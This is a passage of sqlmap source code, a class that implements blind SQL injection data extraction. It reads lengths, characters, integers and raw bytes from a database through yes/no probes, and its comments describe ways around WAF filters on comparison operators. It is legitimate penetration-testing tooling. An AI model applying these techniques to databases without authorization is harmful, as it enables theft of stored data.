#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import binascii

from .atlas import _FREQ_ORDER
from .atlas import _hardWarnings
from .atlas import _HEX_Q_ENCODINGS
from .atlas import _HEXDIGITS
from .atlas import _HEXFN
from .atlas import _isSingleUnicodeScalar
from .atlas import _MAX_HEX_CHAR_NIBBLES
from .atlas import _native
from .atlas import _PRINTABLE_SORTED
from .atlas import _REPL
from .atlas import _SIMILAR_META
from .atlas import _UNICODE_MAX
from .atlas import _unhexlify
from .atlas import _unichr
from .records import Cap
from .records import ExtractResult
from .records import NumericOutOfRange
from .records import OracleUndecided


class _Extraction(object):
    """_Extraction

    turn the discovered dialect into VALUES: length, char reading, literals, hex,
    the public extract*/read* API, and the LIKE pattern-match floor."""

    def _charExists(self, expr, pos):
        # is there a real character at 1-based `pos`? derived from the substring's
        # measured end behavior - the basis for length when no length fn exists.
        one = self._sub(expr, pos, 1)
        if self.dialect.substring.get("beyond_end") == "null-or-error":
            return self._ask("%s IS NOT NULL" % one)
        return self._ask("%s IS NOT NULL" % one) and not self._ask("%s=''" % one)

    def _measureLengthSub(self, expr, ceiling):
        # length via substring: find the largest position that still holds a char.
        # mirrors _measureLength's exponential-then-bisect shape (len>N <=> a char
        # exists at N+1), for backends with substring but no length fn.
        if not self._charExists(expr, 1):
            return (None if self._ask("(%s) IS NULL" % expr) else 0), False
        if self._charExists(expr, ceiling + 1):
            return ceiling, True
        low, high = 1, min(8, ceiling)
        while high < ceiling and self._charExists(expr, high + 1):
            low = high + 1
            high = min(high * 2, ceiling)
        while low < high:
            mid = (low + high) // 2
            if self._charExists(expr, mid + 1):
                low = mid + 1
            else:
                high = mid
        return low, False

    def _hasChars(self, expr):
        # non-empty existence check that works with either a length fn or substring
        if self.dialect.length is not None:
            lexpr = self._len(expr)
            return self._numDefined(lexpr) and not self._ask("%s=0" % lexpr)
        if self.dialect.substring is not None:
            return self._charExists(expr, 1)
        return False

    def _lenEquals(self, expr, n):
        # exact-length corroboration used in discovery, length-fn or substring-derived
        if self.dialect.length is not None:
            return self._ask("%s=%d" % (self._len(expr), n))
        if self.dialect.substring is not None:
            return self._measureLength(expr, ceiling=max(n + 1, 8))[0] == n
        return False

    def _measureLength(self, expr, ceiling=None):
        """Return (length, truncated) - no shared per-call state, and a separate
        `ceiling` so hex/byte pulls can be capped independently of maxlen."""
        ceiling = self.maxlen if ceiling is None else ceiling
        if self.dialect.length is None:
            return self._measureLengthSub(expr, ceiling)
        lexpr = self._len(expr)
        if not self._numDefined(lexpr):
            return None, False
        if self._ask("%s=0" % lexpr):
            return 0, False
        if ceiling < 1:                     # non-empty value but capped to nothing (maxlen=0)
            return 0, True
        try:
            n = self._readNum(lexpr, 1, ceiling)
        except NumericOutOfRange:           # length exceeds the cap -> truncated, not a small value
            return ceiling, True
        return n, False                     # _readNum PROVED n<=ceiling (raises above), so exact-at-cap
                                            # is COMPLETE, not truncated - overflow is the exception above

    def valueLength(self, expr):
        length, truncated = self._measureLength(expr)
        self._lastTruncated = truncated
        return length

    def _literalVariants(self, value):
        # spellings to try for exact char verification; SQL Server & others need an
        # N'...' prefix to preserve non-ASCII, cheap vs accepting a wrong candidate
        yield self._lit(value)
        if any(ord(c) > 127 for c in value):
            yield "N%s" % self._lit(value)

    def _exactCharEquals(self, expr, value):
        return any(self._exactEquals(expr, lit) for lit in self._literalVariants(value))

    def _lit(self, ch):
        # double single quotes always; also double backslashes on engines that treat
        # '\' as an escape char (MySQL/MariaDB default), else '\' + "'" would break
        # the literal and silently corrupt the probe
        if self._backslashEscape is None:
            self._backslashEscape = (self.dialect.length is not None
                                     and self._ask("%s=1" % self._len("'\\\\'")))
        s = ch.replace("\\", "\\\\") if self._backslashEscape else ch
        return _native("'%s'" % s.replace("'", "''"))

    def _bisectCharset(self, greater):
        # greater(c) -> is the source char strictly greater than charset char c?
        cs = _PRINTABLE_SORTED
        lo, hi = 0, len(cs) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            if greater(cs[mid]):
                lo = mid + 1
            else:
                hi = mid
        return cs[lo]

    def _gtNum(self, expr, n, high):
        # "is `expr` > n?" via the discovered comparator (high = current upper bound).
        # BETWEEN expresses the same range test without the '>'/'<' a WAF may strip.
        if self._comparator == "between":
            return self._ask("%s BETWEEN %d AND %d" % (expr, n + 1, high))
        if self._cmpTemplate is not None:       # any operator-free ordered rung (sign/abs/least/nullif/...)
            return self._ask(self._cmpTemplate.format(expr=expr, n=n))
        return self._ask("%s>%d" % (expr, n))

    def _numDefined(self, expr):
        # value is a defined (non-NULL) number - validity gate that needs no '>'
        return self._ask("(%s) IS NOT NULL" % expr)

    def _readNum(self, expr, lo, hi):
        """Bounded numeric read in [lo, hi]. PROVES the value lies in range before
        bisecting - a bounded search must never invent an in-range boundary ('>'
        saturates to `hi`, BETWEEN converges to a wrong SMALL value) - so an
        out-of-range value raises NumericOutOfRange for the caller to classify
        (length -> truncated, integer -> overflow) instead of returning wrong data."""
        if self._comparator == "membership":
            if self._inOk:
                window = 128
                base = lo
                while base <= hi:
                    win = list(range(base, min(base + window, hi + 1)))
                    if self._ask("%s IN (%s)" % (expr, ",".join(str(v) for v in win))):
                        while len(win) > 1:
                            half = win[:len(win) // 2]
                            if self._ask("%s IN (%s)" % (expr, ",".join(str(v) for v in half))):
                                win = half
                            else:
                                win = win[len(win) // 2:]
                        return win[0]
                    base += window
                raise NumericOutOfRange("%s not in [%d,%d]" % (expr, lo, hi))
            for v in range(lo, hi + 1):             # no ordered op and no IN: '=' scan
                if self._ask("%s=%d" % (expr, v)):
                    return v
            raise NumericOutOfRange("%s not in [%d,%d]" % (expr, lo, hi))
        # ordered comparators (gt / between / operator-free rung): prove range first
        if self._comparator == "between":
            if not self._ask("%s BETWEEN %d AND %d" % (expr, lo, hi)):
                raise NumericOutOfRange("%s not in [%d,%d]" % (expr, lo, hi))
        else:                                       # gt or operator-free rung ('>' semantics)
            if self._gtNum(expr, hi, hi):
                raise NumericOutOfRange("%s > %d" % (expr, hi))
            if not self._gtNum(expr, lo - 1, hi):   # expr <= lo-1 -> below range (any sign of lo)
                raise NumericOutOfRange("%s < %d" % (expr, lo))
        low, high = lo, min(max(lo, 8), hi)         # exponential climb keeps small values cheap
        while high < hi and self._gtNum(expr, high, hi):
            low, high = high + 1, min(high * 2, hi)
        while low < high:
            mid = (low + high) // 2
            if self._gtNum(expr, mid, hi):
                low = mid + 1
            else:
                high = mid
        return low

    def _bisectCodes(self, code, codes):
        # ordered bisection over a sorted code list (restricted alphabet)
        lo, hi = 0, len(codes) - 1
        top = codes[hi]
        while lo < hi:
            mid = (lo + hi) // 2
            if self._gtNum(code, codes[mid], top):
                lo = mid + 1
            else:
                hi = mid
        return codes[lo]

    def _bisectCodeRange(self, code):
        # general dynamic-range bisection - a real code-point fn can far exceed 255,
        # so find the tight upper bound first, then bisect
        high = _UNICODE_MAX
        for cap in (127, 255, 0xFFFF, _UNICODE_MAX):
            if not self._gtNum(code, cap, _UNICODE_MAX):
                high = cap
                break
        low = 0
        while low < high:
            mid = (low + high) // 2
            if self._gtNum(code, mid, high):
                low = mid + 1
            else:
                high = mid
        return low

    def _pickCode(self, code, codes):
        # order-free code selection when there's no ordered comparator: IN() subset
        # bisection if available, else a plain '=' scan (last resort, no '<>' needed)
        if self._inOk:
            return self._membershipCode(code, codes)
        for c in codes:
            if self._ask("%s=%d" % (code, c)):
                return c
        return None

    def _membershipCode(self, code, codes):
        # ORDER-FREE subset bisection: split the candidate code list in half and test
        # `code IN (half)` - needs only '='/IN, so it survives blocked '>'/'<'/BETWEEN
        # and collation quirks. ~log2(n) probes. Returns the matched code, or None
        # when the char is outside `codes` (caller escalates to hex / marks it).
        if not self._inOk or not self._ask("%s IN (%s)" % (code, ",".join(str(c) for c in codes))):
            return None
        cand = list(codes)
        while len(cand) > 1:
            half = cand[:len(cand) // 2]
            if self._ask("%s IN (%s)" % (code, ",".join(str(c) for c in half))):
                cand = half
            else:
                cand = cand[len(cand) // 2:]
        return cand[0]

    def _membershipLit(self, one, chars):
        # order-free subset bisection over char LITERALS (no code fn, no ordering) -
        # `chars` is frequency-ordered so the common half resolves first
        if not self._inOk or not self._ask("%s IN (%s)" % (one, ",".join(self._lit(c) for c in chars))):
            return None
        cand = list(chars)
        while len(cand) > 1:
            half = cand[:len(cand) // 2]
            if self._ask("%s IN (%s)" % (one, ",".join(self._lit(c) for c in half))):
                cand = half
            else:
                cand = cand[len(cand) // 2:]
        return cand[0]

    def _ensureHexfn(self):
        # a hex fn may not have been discovered (code/collation mode won the ladder
        # before hex was tried); probe for one on demand so escalation can recover
        # bytes exactly. probes at most once.
        if self.dialect.hexfn is None and not self._hexProbed:
            self._hexProbed = True
            with self._probePhase():        # wrong rungs (e.g. HEX() on PostgreSQL) error -> "unusable", not undecided
                for name, tmpl in _HEXFN:
                    enc = self._hexEncoding(tmpl)
                    if enc is not None:                     # '' = usable, codec unknown (auto-detect)
                        self.dialect.hexfn = Cap(name, tmpl, encoding=(enc or None))
                        break
        return self.dialect.hexfn

    def _hexEncoding(self, tmpl):
        # if `tmpl` hex-encodes a char, return the codec that decodes it (utf-8 /
        # utf-16-be / utf-16-le), else None. 'q'(0x71) must map to that codec's form
        # AND track the char (a DIFFERENT value for 'p'), so a constant can't match.
        hq = tmpl.format(expr=self._sub("'sqlmap'", 2, 1))     # 'q'
        hp = tmpl.format(expr=self._sub("'sqlmap'", 6, 1))     # 'p'
        cf = self._codeCharTmpl()
        for form, enc in _HEX_Q_ENCODINGS:
            if not (self._ask("%s='%s'" % (hq, form)) and not self._ask("%s='%s'" % (hp, form))):
                continue
            # BYTE length-preservation, via the INDEPENDENT length fn (not the hex fn certifying
            # itself). A LONG probe is required: a short sample passes any large-enough fixed cap,
            # so an 8/64/255-byte-capped hex fn would slip through. No usable length measure ->
            # do NOT certify whole-value hex output.
            bpc = 2 if "16" in enc else 1
            probe = "A" * 256
            if not self._lenEquals(tmpl.format(expr="'%s'" % probe), len(probe) * bpc * 2):
                continue
            # PROVE the codec on a NON-ASCII char (EUR 0x20AC): 'q'->'71' is ASCII-compatible in
            # MANY encodings (CP1252/Latin-1/Shift-JIS/GBK/...), NOT just UTF-8, so the 'q' match
            # alone can't certify UTF-8. Confirm with EUR; if it can't be proven the codec is
            # UNKNOWN ('' -> decode auto-detects) - the bytes are still FAITHFUL (length probe
            # passed), so the hex fn stays USABLE; it is NOT rejected (that would drop to a
            # byte-based mode that mangles multibyte). None means only 'no working hex fn'.
            if cf:
                eur = tmpl.format(expr=cf.format(code=0x20AC))
                want = {"utf-8": "e282ac", "utf-16-be": "20ac", "utf-16-le": "ac20"}.get(enc)
                if want and self._ask("LOWER(%s)='%s'" % (eur, want)):
                    return enc
                return ""                  # ASCII-compatible, codec unproven: usable, auto-detect decode
            return ""                      # no char-from-code fn to PROVE the codec: '71'->q is ASCII-
                                           # compatible in many charsets (CP1252/Latin-1/SJIS/...), so it
                                           # is UNKNOWN, not UTF-8 - usable for bytes, not authoritative text
        return None

    def _escalate(self, one, pos):
        # candidate did not verify -> char is outside the searched alphabet.
        # recover its exact bytes via hex if available; otherwise mark it (never
        # silently substitute a space/'~' or delete it)
        if self._ensureHexfn():
            ch = self._readHexChar(one)
            if ch and ch != _REPL:
                return ch
        self.dialect.notes.append("char at position %d outside extraction alphabet - marked" % pos)
        return _REPL

    def _readChar(self, expr, pos, codes=None):
        one = self._sub(expr, pos, 1)
        mode = self.dialect.compare

        if mode == "code":
            code = self.dialect.charcode[1].format(expr=one)
            ordered = self._comparator != "membership"     # gt/between OR an operator-free rung (all bisect via _gtNum)
            if codes is not None:
                # restricted-alphabet (e.g. the hex-framed dump payload): a small ASCII
                # set. no per-char verify - ASCII codes are unambiguous across charcode
                # semantics and extractResult whole-value verifies.
                low = self._bisectCodes(code, codes) if ordered else self._pickCode(code, codes)
                return _unichr(low) if low is not None else self._escalate(one, pos)
            if ordered:
                low = self._bisectCodeRange(code)
            else:
                # no ordered operator: order-free IN() over the printable set (or a '='
                # scan if IN is gone too); anything outside it escalates to hex / marks
                low = self._pickCode(code, [ord(c) for c in _PRINTABLE_SORTED])
                if low is None:
                    return self._escalate(one, pos)
            if 0xD800 <= low <= 0xDFFF:
                # a UTF-16 code-unit fn (SQL Server UNICODE under a non-SC collation)
                # can return an isolated surrogate - not a scalar; recover via bytes
                return self._escalate(one, pos)
            try:
                ch = _unichr(low)            # low==0 is a valid NUL char, not "empty"
            except ValueError:
                return self._escalate(one, pos)
            # a lossy code fn can return a codepage byte, a UTF-8 lead byte, or even
            # '?' (63) for an unrepresentable char - the old low>127-only check
            # silently accepted the last as a literal '?'. only a *proven* code-point
            # fn is trusted outright; everything else must round-trip-verify.
            if self.dialect.charcode.get("semantics") != "codepoint" and \
               not self._exactCharEquals(one, ch):
                return self._escalate(one, pos)
            return ch

        if mode == "hex":
            if self.dialect.hexfn is None:
                return self._escalate(one, pos)
            return self._readHexChar(one)

        if mode == "collation":
            if self.dialect.binwrap is None:
                return self._escalate(one, pos)
            w = self.dialect.binwrap[1]
            cand = self._bisectCharset(lambda c: self._ask("%s>%s" % (w.format(x=one), w.format(x=self._lit(c)))))
            if self._ask("%s=%s" % (w.format(x=one), w.format(x=self._lit(cand)))):
                return cand
            return self._escalate(one, pos)

        if mode == "ordinal":
            cand = self._bisectCharset(lambda c: self._ask("%s>%s" % (one, self._lit(c))))
            if self._ask("%s=%s" % (one, self._lit(cand))):
                return cand
            return self._escalate(one, pos)

        # equality / equality-ci: order-free IN() subset bisection (frequency-ordered,
        # ~log2(n) probes) when IN is usable, else the linear frequency scan
        if self._inOk:
            ch = self._membershipLit(one, _FREQ_ORDER)
            return ch if ch is not None else self._escalate(one, pos)
        for ch in _FREQ_ORDER:
            if self._ask("%s=%s" % (one, self._lit(ch))):
                return ch
        return self._escalate(one, pos)

    def _readHexChar(self, one):
        # read the uppercase-hex byte string of a single source char, digit by
        # digit over [0-9A-F] (case-safe), then pick the encoding by exact round-trip
        # against the source (decoder order alone is endian-ambiguous: 00 41 is both
        # UTF-16BE 'A' and UTF-16LE U+4100).
        hexpr = self.dialect.hexfn[1].format(expr=one)
        hlen, htrunc = self._measureLength(hexpr, ceiling=_MAX_HEX_CHAR_NIBBLES)
        if htrunc or not hlen or hlen % 2 or hlen > _MAX_HEX_CHAR_NIBBLES:
            return _REPL
        # bisect each nibble over [0-9A-F] when hex ordering is reliable (~4 asks
        # vs up to 16); fall back to an equality scan otherwise
        if self._hexOrdered is None:
            self._hexOrdered = (self._ask("'A'>'9'") and self._ask("'F'>'A'") and self._ask("'1'>'0'"))
        digits = ""
        for k in range(1, hlen + 1):
            nib = self._sub(hexpr, k, 1)
            if self._hexOrdered:
                lo, hi = 0, len(_HEXDIGITS) - 1
                while lo < hi:
                    mid = (lo + hi) // 2
                    if self._ask("%s>'%s'" % (nib, _HEXDIGITS[mid])):
                        lo = mid + 1
                    else:
                        hi = mid
                # verify: if nib isn't actually this hex digit (WAF/glitch), bail
                if not self._ask("%s='%s'" % (nib, _HEXDIGITS[lo])):
                    return _REPL
                digits += _HEXDIGITS[lo]
            else:
                for hd in _HEXDIGITS:
                    if self._ask("%s='%s'" % (nib, hd)):
                        digits += hd
                        break
                else:
                    return _REPL
        try:
            raw = _unhexlify(digits)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return _REPL
        # generate every single-scalar candidate and pick the one that round-trips
        # against the source char (resolves the endian ambiguity), preferring the
        # interleaved-NUL-signalled endianness order first
        order = []
        if len(raw) >= 2 and raw[0:1] == b"\x00" and raw[1:2] != b"\x00":
            order += ["utf-16-be", "utf-32-be"]
        if len(raw) >= 2 and raw[1:2] == b"\x00" and raw[0:1] != b"\x00":
            order += ["utf-16-le", "utf-32-le"]
        # UTF first (near-universal), then legacy single/multibyte charsets a non-Unicode
        # backend may hex; each is TRIED only when it round-trips against the source char
        # (see _exactCharEquals below), so adding codecs can only recover MORE, never
        # mis-decode. latin-1 stays last (it accepts any single byte).
        order += ["utf-8", "utf-16-le", "utf-16-be", "utf-32-le", "utf-32-be",
                  "cp1252", "cp1251", "gbk", "shift_jis", "euc-kr", "big5", "latin-1"]
        seen = set()
        for enc in order:
            try:
                dec = raw.decode(enc)
            except (UnicodeDecodeError, ValueError):
                continue
            if dec in seen or not _isSingleUnicodeScalar(dec):
                continue
            seen.add(dec)
            if self._exactCharEquals(one, dec):
                return dec
        return _REPL

    def _textable(self, expr):
        # extraction needs BOTH length and substring to work; length may implicitly
        # cast where substring won't (MSSQL CONCAT(int,..) vs SUBSTRING(int,..)),
        # so the substring primitive must be probed too. with no length fn, the
        # substring probe alone is the textability test.
        length_ok = self.dialect.length is None or self._numDefined(self._len(expr))
        return length_ok and self._ask("%s IS NOT NULL" % self._sub(expr, 1, 1))

    def _resolveText(self, expr):
        # if the expression isn't directly substringable (e.g. a numeric/date column on a
        # strict engine, or PG's `tid`/ctid which has no LENGTH), wrap it in the discovered
        # text cast. probe-safe: an ERRORING length/substring probe here (LENGTH(tid) does
        # not exist) means "not directly textable" -> fall through to the cast, never fatal.
        with self._probePhase():
            if self._textable(expr):
                return expr
            if self.dialect.textcast is not None:
                casted = self.dialect.textcast[1].format(expr=expr)
                # use the cast when it makes a NON-NULL value textable; if the value is
                # currently NULL the cast is STILL correct (LENGTH may not even exist for the
                # raw type, e.g. PG tid) - returning raw there errors on LENGTH(tid) instead
                # of yielding a clean is_null, so prefer the cast in the NULL case too
                if self._textable(casted) or self._ask("(%s) IS NULL" % expr):
                    return casted
        return expr

    def coalesce(self, expr, fallback="''"):
        return self.dialect.coalesce[1].format(expr=expr, fallback=fallback) if self.dialect.coalesce else expr

    def _concatMany(self, parts):
        if len(parts) == 1:
            return parts[0]
        func = self.dialect.concat.get("variadic") if self.dialect.concat else None
        if func:                                     # flat CONCAT(a,b,c,...) when variadic
            return "%s(%s)" % (func, ",".join(parts))
        out = parts[0]
        for p in parts[1:]:
            out = self.dialect.concat[1].format(a=out, b=p)
        return out

    def buildLiteral(self, value):
        """Build a SQL string literal for `value`. Prefers CHAR(code)||... from the
        discovered char-from-code + concat primitives (no quote-escaping pitfalls),
        for ASCII values; otherwise a doubled-quote literal."""
        if value and self.dialect.charfrom and self.dialect.concat and all(0 < ord(c) < 128 for c in value):
            return self._concatMany([self.dialect.charfrom[1].format(code=ord(c)) for c in value])
        return self._lit(value)

    def extract(self, expr, limit=None):
        return self.extractResult(expr, limit).value

    def extractResult(self, expr, limit=None, _ceiling=None, _verify=True, codes=None):
        """Structured text extraction keeping NULL / empty / truncated / failed
        distinct - never conflated into one ambiguous ''/None. `codes` restricts the
        char alphabet (sorted code list) for a big speedup on known-alphabet values."""
        if self.dialect.prefix is not None and self.dialect.substring is None:
            return self._likeExtract(expr, limit)      # MAX-CONSTRAINT pattern-match path
        q0 = self._queries
        expr = self._resolveText(expr)
        ceiling = self.maxlen if _ceiling is None else _ceiling
        length, truncated = self._measureLength(expr, ceiling=ceiling)
        if length is None:
            # >=0 was false: either a genuine NULL or the probe itself failed.
            # PROVE `IS NULL` positively - negating a failed `IS NOT NULL` used to
            # turn every invalid expression into a convincing, "complete" NULL.
            is_null = self._ask("(%s) IS NULL" % expr)
            return ExtractResult(None, is_null=is_null, complete=is_null,
                                 queries=self._queries - q0,
                                 warnings=[] if is_null else ["length probe failed"])
        if limit is not None and limit < length:
            truncated = True                    # a bounded prefix of a longer value
            length = limit
        if length == 0:
            value = ""
        else:
            chars = []
            for i in range(1, length + 1):
                chars.append(self._readChar(expr, i, codes))
                self._emitChar("".join(chars), length)      # live progress: user sees it working
            value = "".join(chars)
        warns = ["contains unresolved char"] if _REPL in value else []
        if self.dialect.compare == "equality-ci":
            warns.append("lossy equality collation: case/accents ambiguous")
        complete = not truncated and not _hardWarnings(warns)   # soft (case/accent) keeps complete
        # a length fn can stop at an embedded NUL, yielding a convincing short prefix.
        # ALWAYS verify the WHOLE reconstructed value once - _exactEquals uses the
        # strongest available comparator (hex > binary wrapper > plain equality); even
        # plain equality catches a NUL-truncated prefix. recover via hex on mismatch.
        # (_verify=False on the internal hex-string pull to avoid re-entry.)
        # escalate to hex when the code/ordinal read is UNTRUSTWORTHY: a complete value that fails
        # whole-value verify (NUL-truncated / wrong), OR one carrying unresolved chars (_REPL) - a
        # code fn lossy for this column's type (e.g. Oracle NVARCHAR2 read in code mode) marks
        # chars outside its alphabet, yet the cast+hex path recovers them cleanly.
        if _verify and (_REPL in value or (complete and not self._exactEquals(expr, self._lit(value)))):
            recovered = self._extractViaHex(expr, q0)
            if recovered is not None:
                return recovered
            if complete:                        # verify failed and no hex recovery -> demote
                complete = False
                warns.append("whole-value verification failed")
        # a value can be EXACT only if a BYTE-FAITHFUL witness backs it: plain SQL '=' and
        # collation/ordinal ordering are collation-dependent (accent/case/width folding), so
        # without a proven hex/binary witness (or code-mode codepoint reads) the recovered
        # bytes are NOT provably the source's - downgrade to WHOLE_BUT_AMBIGUOUS, never EXACT.
        if _verify and value and complete and not self._byteFaithful():
            warns.append("byte-exactness unproven: collation-dependent comparison, no hex/binary witness")
        return ExtractResult(value, complete=complete, truncated=truncated,
                             queries=self._queries - q0, warnings=warns)

    def _byteFaithful(self):
        # is a BYTE-EXACT primitive available to certify a recovered value? a proven hex fn or a
        # binary-compare wrapper is; plain '='/collation is not. Code mode with PROVEN codepoint
        # semantics reads true code points, so it is faithful on its own.
        if self.dialect.hexfn is not None:
            return True
        if self.dialect.binwrap is not None and self.dialect.binwrap.get("byte_exact"):
            return True                     # only a PROVEN byte-exact wrapper (accents tested) counts
        return (self.dialect.compare == "code" and self.dialect.charcode is not None
                and self.dialect.charcode.get("semantics") == "codepoint")

    def _extractViaHex(self, expr, q0=None):
        # recover a full text value through strict hex extraction, or None
        if not self._ensureHexfn():
            return None
        q0 = self._queries if q0 is None else q0
        # route through the text cast, exactly as the framed dump does: a column whose STORAGE
        # charset differs from the DB charset - e.g. Oracle NVARCHAR2 (UTF-16 national charset) -
        # hexes to bytes the DB-charset decode garbles; casting to the DB char type first
        # normalizes it (VARCHAR2 == DB charset), so the decode matches the discovered codec.
        hexpr = self.dialect.textcast[1].format(expr=expr) if self.dialect.textcast else expr
        res = self.extractResult(self.dialect.hexfn[1].format(expr=hexpr),
                                  _ceiling=self.maxbytes * 2, _verify=False)
        if res.is_null:
            return ExtractResult(None, is_null=True, complete=True, queries=self._queries - q0)
        if res.value is None or not res.complete or res.truncated or res.warnings:
            return None
        enc = (self.dialect.hexfn.get("encoding") if self.dialect.hexfn else None) or self.dialect.charset
        # UNKNOWN codec + non-ASCII bytes: the TEXT reading is a GUESS (e.g. UTF-8 bytes with an
        # embedded NUL get heuristically read as UTF-16), so it must NOT be certified exact. Bytes
        # are faithful (they'd round-trip), but only a PROVEN codec makes the decoded text exact.
        if enc is None:
            try:
                rawb = bytearray(_unhexlify(res.value))
            except (TypeError, ValueError, binascii.Error, UnicodeError):
                return None
            if any(b >= 0x80 for b in rawb):
                return None                      # non-ASCII under an unproven codec -> not exact
        dec = self._decodeHexToken(res.value, enc)
        if dec is None:
            return None
        return ExtractResult(dec, complete=True, queries=self._queries - q0,
                             warnings=["recovered via hex after verification mismatch"])

    def _exactEquals(self, left, right):
        # whole-value equality that avoids collation/trailing-space lies
        if self._ensureHexfn():
            t = self.dialect.hexfn[1]
            return self._ask("(%s)=(%s)" % (t.format(expr=left), t.format(expr=right)))
        if self.dialect.binwrap:
            t = self.dialect.binwrap[1]
            return self._ask("(%s)=(%s)" % (t.format(x=left), t.format(x=right)))
        return self._ask("(%s)=(%s)" % (left, right))

    def extractInteger(self, expr, maximum=None):
        """Extract a (possibly signed) integer by range-bounded bisection - avoids
        stringifying and reading digit-by-digit. EVERY numeric decision renders through
        `_gtNum` (the discovered comparator: gt / BETWEEN / operator-free rung), so it
        never emits a raw '>='/'<'/'>' discovery did not validate, and an operator-free
        rung keeps FULL signed range (not the membership magnitude ceiling)."""
        cap = maximum if maximum is not None else 1 << 62
        if not self._numDefined(expr):
            return None
        if self._comparator == "membership":
            # no ordered comparator at all: read the non-negative magnitude (counts /
            # lengths) via the bounded IN/scan window; out-of-range -> overflow.
            ceil = min(cap, 1 << 16)
            try:
                return self._readNum(expr, 0, ceil)
            except NumericOutOfRange:
                raise OverflowError("integer exceeds maximum %d" % ceil)
        # ordered comparator: bracket the value with `expr > n` probes then bisect the
        # transition. The `high` arg to _gtNum MUST exceed any possible value (BETWEEN renders
        # `expr BETWEEN n+1 AND high`; using `cap` there made every over-cap positive read as
        # an empty range -> misclassified NEGATIVE, reporting "below minimum" for an above-max
        # value). Use HUGE as the range ceiling everywhere; `cap` is only the overflow threshold.
        HUGE = 1 << 62
        if self._gtNum(expr, -1, HUGE):                 # expr > -1  <=>  expr >= 0 (any magnitude)
            if self._gtNum(expr, cap, HUGE):            # expr > cap  -> ABOVE maximum
                raise OverflowError("integer exceeds maximum %d" % cap)
            lo, hi = -1, 1
            while hi < cap and self._gtNum(expr, hi, HUGE):
                lo, hi = hi, min(hi * 2 + 1, cap)
        else:                                           # not in [0, HUGE]
            # BETWEEN's sign test caps at HUGE, so a positive value ABOVE HUGE also lands here.
            # distinguish it from a genuine negative before reporting a direction (a gt/operator-
            # free sign test is unbounded, so its else-branch is truly negative and skips this).
            if self._comparator == "between" and not self._ask("(%s) BETWEEN %d AND %d" % (expr, -HUGE, -1)):
                raise OverflowError("integer magnitude exceeds representable range (+/-%d), direction unknown" % HUGE)
            if not self._gtNum(expr, -cap - 1, HUGE):   # expr <= -cap-1 -> BELOW minimum
                raise OverflowError("integer below minimum -%d" % cap)
            hi, lo = -1, -2
            while lo > -cap and not self._gtNum(expr, lo, HUGE):
                hi, lo = lo, lo * 2
            lo = max(lo, -cap - 1)
        # invariant: expr > lo is True, expr > hi is False -> value is the transition in (lo, hi]
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if self._gtNum(expr, mid, HUGE):
                lo = mid
            else:
                hi = mid
        # FINAL INDEPENDENT CHECK: bisection trusts the comparator, which is only PROVEN on
        # integer literals - a backend/WAF that honours '>' on literals but rewrites it (e.g. to
        # '>=') for scalar-subquery / fn / arithmetic operands would converge off-by-one. Confirm
        # the result with a direct equality against the ACTUAL expression; if it isn't decisively
        # true the read is invalid -> fail closed (never return a silently-wrong count/length/id).
        if not self._ask("(%s)=%d" % (expr, hi)):
            raise OracleUndecided("integer read failed final equality check: (%s) != %d" % (expr, hi))
        return hi

    def extractBytes(self, expr):
        """Extract the exact bytes of a string/blob expression via a hex function.
        Byte-exact and collation-independent (the hex string is ASCII [0-9A-F], so
        whatever compare mode is active reads it cleanly). Returns None if no hex
        function is available on the target."""
        if not self._ensureHexfn():
            return None
        # hex doubles the length; cap by maxbytes (a char can be several bytes),
        # not maxlen
        res = self.extractResult(self.dialect.hexfn[1].format(expr=expr),
                                  _ceiling=self.maxbytes * 2, _verify=False)
        hexstr = res.value
        # STRICT: never clean corruption into believable bytes. reject a non-hex
        # char, odd length, incomplete/truncated pull, or an unresolved marker.
        if hexstr is None or not res.complete or res.truncated or res.warnings:
            return None
        if len(hexstr) % 2 or any(c not in _HEXDIGITS + _HEXDIGITS.lower() for c in hexstr):
            return None
        try:
            raw = _unhexlify(hexstr)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return None
        # INDEPENDENT witness: if a byte-length fn was discovered, confirm the recovered byte
        # count matches it (measured by a DIFFERENT primitive than hex) - so a capped/lossy hex
        # that silently shortened the value is caught rather than passed off as "the exact bytes".
        if self.dialect.bytelen is not None:
            # FAIL CLOSED: once a byte-length witness is selected for certification, an undecided
            # or mismatched reading means we CANNOT confirm the bytes are whole -> reject, never
            # treat "couldn't verify" as "matched".
            try:
                expected = self.extractInteger(self.dialect.bytelen[1].format(expr=expr))
            except (OracleUndecided, OverflowError):
                return None
            if expected is None or expected != len(raw):
                return None
        return raw

    def extractText(self, expr, encoding="utf-8", errors="replace"):
        """Extract bytes then decode with a caller-chosen encoding - the reliable
        path when the column's charset is known (e.g. a CP1252 VARCHAR, a UTF-16
        NVARCHAR, or a binary blob). Falls back to char-by-char extract() when the
        target has no hex function."""
        raw = self.extractBytes(expr)
        if raw is None:
            return self.extract(expr)
        return raw.decode(encoding, errors)

    def _likePat(self, prefix_singles, ch, trailing, trailing_multi=False):
        # build a LIKE/GLOB/SIMILAR-TO pattern literal: `single`*before + one literal char +
        # `single`*after (+ a trailing multi-wildcard when the value CONTINUES past what we
        # read - a truncated prefix, from limit< length or length> maxlen). Without that
        # multi the pattern demands an EXACT length and can't match the longer source -> every
        # char would come back unresolved. only `ch` may be special, escaped if so.
        p = self.dialect.prefix
        multi, single = p.get("multi"), p.get("single")
        tail = single * trailing + (multi if trailing_multi else "")
        body = single * prefix_singles
        if p.name == "GLOB" and ch in (multi, single, "["):
            return body + "[%s]" % ch + tail, ""    # GLOB escapes via a char class
        # SIMILAR TO shares %/_ with LIKE but also has regex metachars; LIKE has only %/_
        special = _SIMILAR_META if p.name == "SIMILAR TO" else (multi, single)
        if ch in special:
            return body + "\\" + ch + tail, " ESCAPE '\\'"   # escape via ESCAPE '\'
        return body + ch.replace("'", "''") + tail, ""

    def _likeIs(self, expr, pattern, esc):
        return self._ask("(%s) %s '%s'%s" % (expr, self.dialect.prefix.name, pattern, esc))

    def _likeExtract(self, expr, limit=None):
        p = self.dialect.prefix
        multi, single = p.get("multi"), p.get("single")
        q0 = self._queries
        # NULL vs matches-anything-nonnull
        if not self._likeIs(expr, multi, ""):
            is_null = self._ask("(%s) IS NULL" % expr)
            return ExtractResult(None, is_null=is_null, complete=is_null,
                                 queries=self._queries - q0,
